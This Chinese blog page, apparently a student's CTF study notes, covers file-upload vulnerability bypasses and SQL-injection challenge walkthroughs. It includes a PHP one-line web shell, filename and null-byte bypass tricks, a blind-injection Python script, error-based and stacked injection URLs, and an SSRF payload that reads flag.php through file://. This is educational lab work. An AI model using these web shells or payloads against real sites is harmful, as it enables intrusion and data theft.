<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>WEB中上传文件，服务器读取这个分段(multipart)提取并保存，通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol>
<li>上传web脚本语言，服务器执行恶意代码</li>
<li>上传flash的策略文件crossdomain.xml，攻击者控制在该域的行为</li>
<li>上传病毒木马，诱导用户下载执行</li>
<li>上传钓鱼图片</li>
<li>上传php脚本，文件包含执行</li>
</ol>
<h3 id="防范与绕过"><a href="#防范与绕过" class="headerlink" title="防范与绕过"></a>防范与绕过</h3><h4 id="1-前端过滤"><a href="#1-前端过滤" class="headerlink" title="1.前端过滤"></a>1.前端过滤</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h5><p><strong>在表单中使用onsumbit&#x3D;checkFile()调用js函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</strong></p>
<h5 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h5><p>上传一句话木马，改名jpg格式，bp抓包改回php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-检查扩展名"><a href="#2-检查扩展名" class="headerlink" title="2.检查扩展名"></a>2.检查扩展名</h4><p>在服务器进行检查，过滤掉不合法的扩展名文件，有白名单和黑名单</p>
<p>绕过方法：在一些Web server中，存在解析漏洞:<br>1.老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 <strong>&#x2F;.asp&#x2F;目录</strong>，那么此目录下面的一切内容都会被当作asp脚本来解析<br>2.老版本的IIS6中的<strong>分号漏洞</strong>：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg<br>3.旧版Windows Server中存在<strong>空格和dot漏洞</strong>类似于 <strong>a.php. 和 a.php[空格]</strong> 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行<br>4.nginx(0.5.x, 0.6.x, 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37**)空字节漏洞 xxx.jpg%00.php** 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）<br>5.apache1.x,2.x的<strong>解析漏洞</strong>，上传如<strong>a.php.rar a.php.gif</strong> 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候<strong>是从右向左读</strong>，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</p>
<h4 id="检查Content-Type"><a href="#检查Content-Type" class="headerlink" title="检查Content-Type"></a>检查Content-Type</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改。</p>
<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application&#x2F;php改为其他web程序允许的类型。</p>
<h4 id="3-文件头检查文件"><a href="#3-文件头检查文件" class="headerlink" title="3.文件头检查文件"></a>3.文件头检查文件</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p>利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</p>
<p>例如：TIFF (tif)  49492A00</p>
<h5 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便（47494638），因为全都是文本可打印字符。）</p>
<h4 id="4-限制Web-Server对特定类型文件的行为"><a href="#4-限制Web-Server对特定类型文件的行为" class="headerlink" title="4.限制Web Server对特定类型文件的行为"></a>4.限制Web Server对特定类型文件的行为</h4><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 .&#x2F;upload&#x2F; 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。(在Response的Content-type修改)</p>
<ol>
<li><p>指定特定文件名的处理方式(纯文本)<code>   AddType text/plain .pl .py .php</code></p>
</li>
<li><p>完全禁止特定扩展名的文件被访问(黑名单)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   Options -ExecCGI</span><br><span class="line">   AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</span><br><span class="line"></span><br><span class="line">3. 强制web服务器对于特定文件类型的处理，**与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>&lt;FilesMatch “.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$”&gt;<br>ForceType text&#x2F;plain</p>
</FilesMatch>
```
</li>
<li><p>只允许访问特定类型文件(白名单)</p>
</li>
</ol>
<h5 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，<strong>覆盖掉服务器上的文件，来定义文件类型和执行权限</strong>如果做到了这一点，将获得相当大的权限。</p>
<p>补充知识htaccess：</p>
<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。概述来说，htaccess文件是Apache服务器中的一个配置文件，它<strong>负责相关目录下的网页配置</strong>。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<h4 id="5-。文件系统00阻断"><a href="#5-。文件系统00阻断" class="headerlink" title="5,。文件系统00阻断"></a>5,。文件系统00阻断</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><p><strong>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。</strong>利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00、%00上传截断漏洞。</p>
<h5 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a><strong>绕过方法</strong></h5><p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p>
<h4 id="6-NTFS文件系统特性绕过"><a href="#6-NTFS文件系统特性绕过" class="headerlink" title="6.NTFS文件系统特性绕过"></a>6.NTFS文件系统特性绕过</h4><p>NTFS交换数据流（alternate data streams简称ADS）是NTFS磁盘格式的新特性，见漏洞详细可查CVE-1999-0278。</p>
<p>一个完整的流的格式为：::<br>文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。<br>修改宿主文件的内容或流的内容，不会对彼此造成影响。<br>流类型总是以符 号 作 为 开 始 ，NTFS文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是data流 ( 符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流(符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流(DATA)，默认流名为空。<br>ADS可以省略流名，但不能省略流类型。<br>NTFS文件系统中的文件夹没有data流，但可以指派data流，文件夹的主流为directory流 ， 流 名 默 认 为 l30<br><strong>当我们对一个在NTFS分区中的ASP文件发出包含D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “ . ” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA，结果IIS不认为这是一个ASP文件，而文件系统可以识别该请求，于是返回ASP的源代码。</strong></p>
<h5 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>看不懂先跳了</p>
<h4 id="7-二次渲染绕过"><a href="#7-二次渲染绕过" class="headerlink" title="7.二次渲染绕过"></a>7.二次渲染绕过</h4><p>图片的二次渲染形成代码</p>
<h4 id="8-条件竞争"><a href="#8-条件竞争" class="headerlink" title="8.条件竞争"></a>8.条件竞争</h4><h5 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h5><p>与服务端频繁交互导致处理顺序出错</p>
<h4 id="9-其他漏洞"><a href="#9-其他漏洞" class="headerlink" title="9.其他漏洞"></a>9.其他漏洞</h4><ol>
<li>后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； 例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】</li>
<li>双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如”php”字符串过滤的； 例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个”php”字符串”后，开头的’p’和结尾的’hp’就组合又形成了【php】。</li>
<li>特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； 例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。</li>
</ol>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="color: #03a9f4">学习笔记</a>
        </span>
        
    </div>
    <a href="/article/3998144523/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/article/2093147683/">
        <h2 class="post-title">20240331刷题日记-sql</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/category/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                ctf刷题日记
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/3/31
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="20240331刷题日记"><a href="#20240331刷题日记" class="headerlink" title="20240331刷题日记"></a>20240331刷题日记</h1><h2 id="sql-sample复现"><a href="#sql-sample复现" class="headerlink" title="sql_sample复现"></a>sql_sample复现</h2><p>找不到注入点，什么都被过滤，想起来有个robots.txt文件，发现hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and wxccc yyds.</span><br><span class="line"></span><br><span class="line">select * from users where username=&#x27;$_POST[&quot;username&quot;]&#x27; and password=&#x27;$_POST[&quot;password&quot;]&#x27;;</span><br></pre></td></tr></table></figure>

<p>密码必须输入wxccc？username单引号闭合</p>
<p>没思路，去看wp了</p>
<p><img src="/../images/sql.png"></p>
<p>根据sql语句，可以加入\使引号改变闭合</p>
<p>payload可以是password&#x3D;or 1 #&amp;username&#x3D;admin\</p>
<img src="../images/0331-2.png"  />

<p>可以看到回显改变了，由于没学python，copy了一下脚本，用的应该是bool盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://210.30.97.133:28095/index.php&quot;</span></span><br><span class="line">temp = &#123;&#125;</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high =<span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        payload = <span class="string">&#x27;^ (ascii(substr((password),%d,1))&gt;%d)#&#x27;</span> % (i,mid)</span><br><span class="line">        <span class="comment"># select * from test where name=&#x27;admin\&#x27; and password=^ (ascii(substr((password),%d,1))&gt;%d)#</span></span><br><span class="line">        <span class="comment"># &#x27;admin and password=&#x27;^ (ascii(substr((password),%d,1))&gt;%d)   异或必为真</span></span><br><span class="line">        temp=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin\\&quot;</span>,<span class="string">&quot;password&quot;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url,data=temp)</span><br><span class="line">        <span class="built_in">print</span>(low,high,mid,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wxccc&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    password +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password=&quot;</span>,password)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这下知道wxccc是干嘛的了，标记正确页面，运行得到密码</p>
<p>password&#x3D; OhyOuFOuNdit</p>
<p>在网页登录就拿到flag了</p>
<p><img src="/../images/0331-3.png"></p>
<p>异或的用法第一次见到，长知识了</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/105123395">https://blog.csdn.net/SopRomeo/article/details/105123395</a></p>
<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>1.添加用户</p>
<p><img src="/../images/0331-4.png"></p>
<p>2.点进去admin，发现url中有get no，尝试注入</p>
<p>?no&#x3D;1’ 会报错’’’，猜是数字型注入</p>
<p>?no&#x3D;1 group by 4–+    列数为4</p>
<p>?no&#x3D;1’ union select 1,2,3,4–+ <img src="/../images/0331-5.png"></p>
<p>union select被过滤了,但是各自没有单独过滤,加注释绕过?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,2,3,4–+</p>
<p><img src="/../images/0331-6.png"></p>
<p>2是回显位，?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,database(),3,4–+查库名</p>
<p><img src="/../images/0331-7.png"></p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,group_concat(table_name) from information_schema.tables,3,4#</p>
<p>在3,4处一直报错找不到原因，干脆用updatexml报错注入</p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,updatexml(1,concat(‘~’,(select table_name from information_schema.tables where table_schema&#x3D;’fakebook’)),3),3,4#</p>
<p><img src="/../images/0331-8.png"></p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,updatexml(1,concat(‘~’,<br>(select column_name from information_schema.columns where table_schema&#x3D;’fakebook’ and table_name&#x3D;’users’ limit 0,1)),3),3,4#</p>
<p>回显<code>[*] query error! (XPATH syntax error: &#39;~no&#39;)</code></p>
<p>逐行读取：no username passwd data </p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,updatexml(1,concat(‘~’,<br>(select group_concat(username,passwd) from users)),3),3,4#</p>
<p>回显<code>[*] query error! (XPATH syntax error: &#39;~adminc7ad44cbad762a5da0a452f9e8&#39;)</code></p>
<p>暂且不知道有什么用</p>
<p>登录不上去，卡住了TAT</p>
<p><img src="/../images/0331-9.png"></p>
<p>robots.txt扫到这个文件，下载后打开</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看起来是验证注册时的字段用的</p>
<p>看了wp知道，这是考文件读取，用御剑可以扫到flag.php，读取不出来</p>
<p>get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。猜测可能flag.php处于内网，如果用ssrf访问flag.php，可以用伪协议file:&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php访问。注入时&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php刚才扫目录得知flag.php也在这个目录中，user()查权限，是root权限，可以读取flag</p>
<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4–+ 直接读取失败</p>
<p>查上面的data列，是个序列化后的UserInfo对象</p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,group_concat(no,data),3,4 from users#           看了wp才知道，Union报错是因为没把from写在后边</p>
<p><code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:10:&quot;orange.com&quot;;&#125;,2O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;root&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:12:&quot;bilibili.com&quot;;&#125;</code></p>
<p>反序列化还没学，以后补档</p>
<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’</p>
<p>data:text&#x2F;html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tmMDcxMTU1OS02MmY4LTQ0YmItODljYi0wNjM1NTFlZmYwOTJ9IjsNCmV4aXQoMCk7DQo&#x3D;</p>
<p>base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&#123;f0711559-62f8-44bb-89cb-063551eff092&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlebao/p/14104036.html">https://www.cnblogs.com/junlebao/p/14104036.html</a></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tag/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" style="color: #ffa2c4">ctf刷题日记</a>
        </span>
        
    </div>
    <a href="/article/2093147683/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/article/2623458554/">
        <h2 class="post-title">20240330刷题日记</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/category/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                ctf刷题日记
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/3/30
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="2024-3-30-主站刷题"><a href="#2024-3-30-主站刷题" class="headerlink" title="2024&#x2F;3&#x2F;30 主站刷题"></a>2024&#x2F;3&#x2F;30 主站刷题</h1><h2 id="1-ez-sql"><a href="#1-ez-sql" class="headerlink" title="1.ez_sql"></a>1.ez_sql</h2><p>1.测试注入类型<br>  回显 2-1不等于1，字符型</p>
<p>2.判断闭合方式</p>
<p>  1‘看报错，得知单引号闭合</p>
<p>3.查列数</p>
<p>group by得2列</p>
<p>4.union select查询</p>
<p>select被过滤，绕过方法也失效，采用报错注入</p>
<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27%7C%7Cextractvalue(1,concat(%27$%27,(database())))%7C%7C%271%27=%271">http://210.30.97.133:28043/?inject=1&#39;||extractvalue(1,concat(&#39;$&#39;,(database())))||&#39;1&#39;=&#39;1</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1105 : Unknown XPATH variable at: &#x27;$supersqli&#x27;</span><br></pre></td></tr></table></figure>

<p>拿表名</p>
<p>发现过滤了&#x3D;&#x3D;.&#x3D;&#x3D;号，还过滤了where，查资料发现可以堆叠注入</p>
<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> databases;#</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;`</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> tables;#</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>select被过滤</p>
